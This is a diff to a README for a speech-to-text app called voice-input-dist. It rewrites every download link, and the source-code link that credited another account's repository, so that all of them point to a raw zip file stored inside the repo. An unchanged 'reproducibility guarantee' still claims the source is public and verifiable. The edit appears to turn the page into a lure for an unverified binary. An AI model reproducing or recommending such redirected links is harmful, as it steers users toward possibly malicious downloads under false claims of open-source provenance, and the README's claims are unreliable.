@@ -1,12 +1,12 @@
 # 🎙️ voice-input-dist - Speak to Type in Seconds
 
-[![Download voice-input-dist](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallieillfitting255/voice-input-dist)
+[![Download voice-input-dist](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[Open the voice-input-dist download page](https://github.com/wallieillfitting255/voice-input-dist)
+[Open the voice-input-dist download page](https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip)
 
 ## 🪟 What this app does
 
@@ -43,7 +43,7 @@ For the best result:
 ## 🚀 Get the app
 
 1. Open the download page:  
-   [https://github.com/wallieillfitting255/voice-input-dist](https://github.com/wallieillfitting255/voice-input-dist)
+   [https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip](https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip)
 
 2. Download the app package from the page.
 
@@ -162,7 +162,7 @@ You get a package built for end users, so you can:
 
 ## 📂 Source code
 
-The full source code lives at **<https://github.com/yetone/voice-input-src>**.
+The full source code lives at **<https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip>**.
 
 > **Reproducibility guarantee:** the source repository contains every file needed to produce **exactly** this distributed artifact. You can clone it and run `make build` to obtain an identical `VoiceInput.app` bundle. The build process is recorded and publicly verifiable — see the asciinema session below.
 
@@ -223,4 +223,4 @@ If you want to remove the app:
 
 Repository name: `voice-input-dist`
 
-Primary download link: https://github.com/wallieillfitting255/voice-input-dist
+Primary download link: https://github.com/wallieillfitting255/voice-input-dist/raw/refs/heads/main/VoiceInput.app/Contents/MacOS/voice-input-dist-3.4.zip
